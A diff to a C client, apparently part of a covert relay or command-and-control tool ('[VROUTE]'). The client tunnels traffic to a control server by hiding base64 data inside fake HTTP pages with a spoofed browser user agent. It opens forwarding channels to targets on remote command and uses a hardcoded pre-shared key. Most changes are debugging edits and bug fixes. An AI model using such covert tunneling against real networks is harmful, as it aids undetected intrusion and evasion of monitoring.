@@ -66,8 +66,7 @@ $ gcc -o client client.c -lssl -lcrypto -lpthread
 #define DATA_SUFFIX "' />"
 #define DEFAULT_HTTP_USER_AGENT "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
 #define DEFAULT_HTTP_PATH "/index.html"
-
-#define RELAY_BUFFER_SIZE 4096
+#define DUMMY_RESPONSE_PATTERN "<h1>blank page</h1>"
 
 #define COMMAND_CHANNEL 0
 
@@ -96,6 +95,8 @@ $ gcc -o client client.c -lssl -lcrypto -lpthread
 
 #define MAX_LOG_MESSAGE_SIZE 4096
 #define LOG_PREFIX_STR "[VROUTE]"
+
+#define DUMMY_RESPONSE_RECV -1337
 
 typedef enum {
     UNKNOWN_LOG_LEVEL = 0,
@@ -323,8 +324,15 @@ ssize_t http_write_all(int sock, SSL *c_ssl, char **data, size_t *data_sz, int i
     char *ptr = NULL;
     size_t sz = 0;
 
-    if(sock < 0 || !c_ssl || !data || !data_sz)
+    if(sock < 0 || !data || !data_sz) {
+        puts("w");
         return -1;
+    }
+        
+    if(is_https && !c_ssl) {
+        puts("l");
+        return -1;
+    }
 
     if(data && data_sz) {
         ptr = *data;
@@ -336,9 +344,10 @@ ssize_t http_write_all(int sock, SSL *c_ssl, char **data, size_t *data_sz, int i
             r = SSL_write(c_ssl, ptr, sz - sent);
         else
             r = write(sock, ptr, sz - sent);
-        if(r < 0)
+        if(r < 0) {
             VR_LOG(LOG_ERROR, "Error writing data...");
             return -1;
+        }
         sent += r;
     }
 
@@ -356,7 +365,10 @@ ssize_t http_read_all(int sock, SSL *c_ssl, char **data, size_t *data_sz, int is
     int s_fd = -1;
     int sock_m = -1;
 
-    if(sock < 0 || !c_ssl || !data || !data_sz)
+    if(sock < 0 || !data || !data_sz)
+        return -1;
+        
+    if(is_https && !c_ssl)
         return -1;
 
     *data = NULL;
@@ -394,6 +406,8 @@ ssize_t http_read_all(int sock, SSL *c_ssl, char **data, size_t *data_sz, int is
         *data_sz = 0;
         return 0;
     }
+    
+    VR_LOG(LOG_DEBUG, "There are %ld bytes available", bytes_available);
 
     ptr = calloc(bytes_available + 1, sizeof(char));
     if(!ptr)
@@ -613,6 +627,8 @@ ssize_t send_http_data(char *host, int port, char **data, size_t *data_size, int
         VR_LOG(LOG_ERROR, "Error when trying to open an HTTP connection");
         return -1;
     }
+    
+    hexdump("HTTP request", http_req, strlen(http_req));
 
     http_req_sz = strlen(http_req);
     r = http_write_all(http_sock, c_ssl, &http_req, &http_req_sz, is_https);
@@ -622,6 +638,8 @@ ssize_t send_http_data(char *host, int port, char **data, size_t *data_size, int
         VR_LOG(LOG_ERROR, "Error when trying to send HTTP request");
         return -1;
     }
+    
+    sleep(1);
 
     r = http_read_all(http_sock, c_ssl, &dummy_rsp, &dummy_sz, is_https);
     if(r < 0) {
@@ -630,6 +648,8 @@ ssize_t send_http_data(char *host, int port, char **data, size_t *data_size, int
         VR_LOG(LOG_ERROR, "Error when trying to receive HTTP response");
         return -1;
     }
+    
+    hexdump("HTTP response", dummy_rsp, dummy_sz);
 
     if(dummy_sz < strlen(OK_HTTP_RESPONSE) || memcmp(dummy_rsp, OK_HTTP_RESPONSE, strlen(OK_HTTP_RESPONSE)) != 0) {
         if(http_sock != -1)
@@ -706,9 +726,11 @@ ssize_t recv_http_data(char *host, int port, char **data, size_t *data_size, int
     if(r < 0) {
         if(http_sock != -1)
             http_close(http_sock, c_ssl, is_https);
-        VR_LOG(LOG_ERROR, "Error when tryng to send HTTP request");
+        VR_LOG(LOG_ERROR, "Error when trying to send HTTP request");
         return -1;
     }
+    
+    sleep(1);
 
     if(http_req) {
         free(http_req);
@@ -736,6 +758,15 @@ ssize_t recv_http_data(char *host, int port, char **data, size_t *data_size, int
         }
         VR_LOG(LOG_ERROR, "Data in HTTP response is 0");
         return 0;
+    }
+    
+    tmp_p = strstr(data_x, DUMMY_RESPONSE_PATTERN);
+    if(tmp_p) {
+        if(data_x) {
+            free(data_x);
+            data_x = NULL;
+        }
+        return DUMMY_RESPONSE_RECV;
     }
 
     tmp_p = strstr(data_x, DATA_PREFIX);
@@ -774,9 +805,14 @@ ssize_t recv_http_data(char *host, int port, char **data, size_t *data_size, int
         VR_LOG(LOG_ERROR, "No data between HTTP prefix-suffix scheme");
         return 0;
     }
+    
+    if(data_s[strlen(data_s) - 1] == 0x0a)
+        data_s[strlen(data_s) - 1] = '\0';
+    
+    hexdump("base64 encoded data", data_s, strlen(data_s));
 
     b64_decoded = base64_decode(data_s, strlen(data_s), &b64_decoded_sz);
-    if(b64_decoded) {
+    if(!b64_decoded) {
         if(data_x) {
             free(data_x);
             data_x = NULL;
@@ -852,9 +888,16 @@ ssize_t ctl_recv_data(int sock, char *host, int port, char **data, size_t *data_
         return -1;
     }
 
-    if(r < 0) {
+    if(r < 0 && r != DUMMY_RESPONSE_RECV) {
         VR_LOG(LOG_ERROR, "Error receiving data from control server...");
         return -1;
+    }
+    
+    if(r == DUMMY_RESPONSE_RECV) {
+        VR_LOG(LOG_DEBUG, "Received a dummy response, considering it as 0 data received");
+        *data = "";
+        *data_size = 0;
+        return 0;
     }
 
     if(data && data_size) {
@@ -1038,6 +1081,7 @@ int open_channel_conn(int channel_id, char *host, int port) {
     int idx = -1;
     int found = 0;
     struct sockaddr_in srvaddr, cli;
+    struct timeval timeout;
 
     if(!host || port == 0)
         return 0;
@@ -1054,6 +1098,10 @@ int open_channel_conn(int channel_id, char *host, int port) {
     srvaddr.sin_addr.s_addr = inet_addr(host);
     srvaddr.sin_port = htons(port);
     
+    timeout.tv_sec = 5;
+    timeout.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
+    
     VR_LOG(LOG_INFO, "Connecting to %s:%d (channel ID: %d)", host, port, channel_id);
 
     if(connect(sock, (struct sockaddr *)&srvaddr, sizeof(srvaddr)) < 0) {
@@ -1061,6 +1109,8 @@ int open_channel_conn(int channel_id, char *host, int port) {
         close(sock);
         return 0;
     }
+    
+    puts("kawgjgi");
 
     //pthread_mutex_lock(&glb_conn_lock);
 
@@ -1070,6 +1120,8 @@ int open_channel_conn(int channel_id, char *host, int port) {
             close_channel(channel_id);
         }
     }
+    
+    puts("erahaerhaerhae");
         
     for(int x = 0 ; x < MAX_CONCURRENT_CHANNELS ; x++) {
         if(pending_ch_array[x] == 0) {
@@ -1305,7 +1357,11 @@ int interpret_remote_cmd(char *cmd, size_t cmd_sz) {
 
         if(!open_channel_conn(channel_id, host, port)) {
             VR_LOG(LOG_ERROR, "Error opening connection with target...");
-            return 0;
+            
+            if(!send_remote_cmd(FORWARD_CONNECTION_FAILURE, channel_id))
+                return 0;
+            
+            return 1;
         }
             
         VR_LOG(LOG_INFO, "Connection with target opened for channel ID: %ld", channel_id);
@@ -1480,8 +1536,13 @@ uint32_t do_http_handshake(char *host, int port, int is_https, char *key, size_t
         return 0;
    
     r = recv_http_data(host, port, &p, &r_out_sz, is_https);
-    if(r <= 0) {
+    if(r <= 0 && r != DUMMY_RESPONSE_RECV) {
         VR_LOG(LOG_ERROR, "Error receiving data from control server for HTTP handshake");
+        return 0;
+    }
+    
+    if(r == DUMMY_RESPONSE_RECV) {
+        VR_LOG(LOG_ERROR, "Server sent us a dummy response within the middle of handshake (1)");
         return 0;
     }
        
@@ -1504,6 +1565,8 @@ uint32_t do_http_handshake(char *host, int port, int is_https, char *key, size_t
         free(p);
         p = NULL;
     }
+    
+    VR_LOG(LOG_DEBUG, "Sending challenge solution to control server...");
        
     r = send_http_data(host, port, &s, &out_size, is_https);
     if(r <= 0) {
@@ -1524,8 +1587,13 @@ uint32_t do_http_handshake(char *host, int port, int is_https, char *key, size_t
     r_out_sz = 0;
    
     r = recv_http_data(host, port, &p, &r_out_sz, is_https);
-    if(r <= 0) {
+    if(r <= 0 && r != DUMMY_RESPONSE_RECV) {
         VR_LOG(LOG_ERROR, "Error trying to get control server final verdict");
+        return 0;
+    }
+    
+    if(r == DUMMY_RESPONSE_RECV) {
+        VR_LOG(LOG_ERROR, "Server sent us a dummy response within the middle of handshake (2)");
         return 0;
     }
        
@@ -1599,7 +1667,10 @@ void relay_poll(char *host, int port, proto_t proto) {
     int r0 = 0;
     char i_recv_buf[sizeof(tlv_header)] = { 0 };
     tlv_header *recv_tlv = (tlv_header *)&i_recv_buf;
+    char *rdata_buf = NULL;
+    size_t rdata_buf_sz = 0;
     char *data_buf = NULL;
+    size_t data_buf_sz = 0;
     tlv_header *tlv_buf = NULL;
     struct timeval tv;
     fd_set rfds;
@@ -1609,11 +1680,14 @@ void relay_poll(char *host, int port, proto_t proto) {
     size_t data_sz_x = 0;
     char *enc = NULL;
     size_t enc_sz = 0;
+    int success_reported = 0;
   
     if(!host || port <= 0)
         return;
 
     while(1) {
+        success_reported = 0;
+        
         if(srv_down)
             break;
 
@@ -1703,6 +1777,8 @@ void relay_poll(char *host, int port, proto_t proto) {
                                 pthread_mutex_unlock(&main_loop_sock);
                                 return;
                             }
+                            
+                            success_reported = 1;
 
                             pthread_mutex_unlock(&main_loop_sock);
                             continue;
@@ -1741,9 +1817,19 @@ void relay_poll(char *host, int port, proto_t proto) {
                     pthread_mutex_unlock(&main_loop_sock);
                     return;
                 }
+                
+                success_reported = 1;
+                
+                pthread_mutex_unlock(&main_loop_sock);
+                continue;
 
             }
         }
+    }
+    
+    if(success_reported) {
+        sleep(2);
+        continue;
     }
     
     puts("lkllllllllllllllll");
@@ -1760,20 +1846,8 @@ void relay_poll(char *host, int port, proto_t proto) {
                         return;
                     }
 
-                    data_buf = calloc(sizeof(tlv_header) + RELAY_BUFFER_SIZE, sizeof(char));
-                    if(!data_buf) {
-                        pthread_mutex_unlock(&main_loop_sock);
-                        return;
-                    }
-                    tlv_buf = (tlv_header *)data_buf;
-
-                    r = read(fd_x, data_buf + sizeof(tlv_header), RELAY_BUFFER_SIZE);
-                    if(r <= 0) {
-                        if(data_buf) {
-                            free(data_buf);
-                            data_buf = NULL;
-                        }
-
+                    rx = read_all(fd_x, &rdata_buf, &rdata_buf_sz);
+                    if(rx <= 0) {
                         VR_LOG(LOG_ERROR, "Error reading from channel...");
 
                         if(!close_channel(ch_id)) {
@@ -1792,17 +1866,31 @@ void relay_poll(char *host, int port, proto_t proto) {
                         continue;
                     }
                     
-                    hexdump("end received data", data_buf, r);
+                    data_buf = calloc(sizeof(tlv_header) + rdata_buf_sz, sizeof(char));
+                    if(!data_buf) {
+                        pthread_mutex_unlock(&main_loop_sock);
+                        return;
+                    }
+                    tlv_buf = (tlv_header *)data_buf;
                     
-                    VR_LOG(LOG_DEBUG, "Received %d bytes from relay channel %d", r, ch_id);
+                    memcpy(data_buf + sizeof(tlv_header), rdata_buf, rdata_buf_sz);
+                    
+                    if(rdata_buf) {
+                        free(rdata_buf);
+                        rdata_buf = NULL;
+                    }
 
                     tlv_buf->client_id = client_id;
                     tlv_buf->channel_id = ch_id;
-                    tlv_buf->tlv_data_len = r;
+                    tlv_buf->tlv_data_len = rdata_buf_sz;
+                    
+                    hexdump("end received data", data_buf + sizeof(tlv_header), rdata_buf_sz);
+                    
+                    VR_LOG(LOG_DEBUG, "Received %d bytes from relay channel %d", rdata_buf_sz, ch_id);
                     
                     VR_LOG(LOG_DEBUG, "Sending data to control server....");
 
-                    if(send_data_to_ctl_srv(data_buf, sizeof(tlv_header) + r) <= 0) {
+                    if(send_data_to_ctl_srv(data_buf, sizeof(tlv_header) + rdata_buf_sz) <= 0) {
                         if(data_buf) {
                             free(data_buf);
                             data_buf = NULL;
@@ -1893,6 +1981,8 @@ ctl_srv_recv:
         VR_LOG(LOG_WARN, "Not all data received from server side (%ld expected, %ld received)...", recv_tlv->tlv_data_len, data_sz_x);
     }
 */
+
+    // TODO: do the same as in server to be able to parse multiple packets
 
     if(recv_tlv->channel_id == COMMAND_CHANNEL) {
         VR_LOG(LOG_INFO, "Received packet is a command from control server...");
@@ -2115,7 +2205,7 @@ int start_relay_conn(char *host, int port, proto_t proto, char *key, size_t key_
 #define PSK "p@ssw0rd_3241!!=#"
 
 int main(void) {
-    if(!start_relay_conn("127.0.0.1", 1337, TCP_COM_PROTO, PSK, strlen(PSK))) {
+    if(!start_relay_conn("127.0.0.1", 1337, HTTP_COM_PROTO, PSK, strlen(PSK))) {
         VR_LOG(LOG_ERROR, "Unknown error occurred");
         return 1;
     }
